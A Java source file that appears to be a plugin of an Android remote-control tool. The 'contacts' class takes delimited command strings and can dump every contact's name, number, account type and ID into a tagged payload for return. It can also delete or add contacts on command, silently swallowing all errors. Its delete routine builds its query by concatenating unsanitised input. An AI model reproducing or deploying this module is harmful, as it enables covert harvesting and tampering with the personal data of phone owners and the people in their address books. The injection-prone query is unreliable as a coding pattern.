package plugens.angel.plugens;
import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Context;
import android.content.OperationApplicationException;
import android.database.Cursor;
import android.net.Uri;
import android.os.RemoteException;
import android.provider.ContactsContract;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
public class contacts {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        switch(d[0]){
            case "contacts":
                try {
                        StringBuffer sb = new StringBuffer();
                        ContentResolver CR = c.getContentResolver();
                        Cursor cur = CR.query(ContactsContract.Data.CONTENT_URI, null,
                                ContactsContract.Data.HAS_PHONE_NUMBER + "!=0 AND (" + ContactsContract.Data.MIMETYPE + "=? OR " + ContactsContract.Data.MIMETYPE + "=?)",
                                new String[]{ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE},
                                ContactsContract.Data.CONTACT_ID);
                        while (cur.moveToNext()) {
                            String name = cur.getString(cur.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
                            String number = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            String connected_via = cur.getString(cur.getColumnIndex(ContactsContract.Data.ACCOUNT_TYPE_AND_DATA_SET));
                            int id = cur.getInt(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));

                            sb.append(name + SPL_ARRAY + number + SPL_ARRAY + connected_via + SPL_ARRAY + id + SPL_LINE);
                        }
                    cur.close();
                    String s0 = OBJ + SPL_DATA + sb.toString() ;
                    f =  s0.getBytes();
                    return f;
                } catch (Exception e) {}
                break;
            case "del":
                del(c,d[1],d[2]);
                break;
            case "add":
                add(c,d[1],d[2]);
                break;
        }
        return f;
    }
    private void del(Context ctx,String id,String num) {
                try {
                    Uri url = ContactsContract.Data.CONTENT_URI;
                    String where = ContactsContract.Data.CONTACT_ID + " = '" + id + "' AND " +
                            ContactsContract.Data.MIMETYPE + " = '" + ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE +
                            "' AND " + ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + num + "'";
                   ctx.getContentResolver().delete(url, where, null);
                } catch (Exception e) {}
        }
    private void add(Context ctx ,String nm, String nu) {
        try {
            ArrayList CPO = new ArrayList();
            CPO.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                    .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null).withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null).build());
            CPO.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, nm).build());
            CPO.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, nu).withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE).build());
            try {
                ctx.getContentResolver().
                        applyBatch(ContactsContract.AUTHORITY, CPO);
            } catch (RemoteException e) {
            } catch (OperationApplicationException e) {}
            } catch (Exception e) {}
    }
}
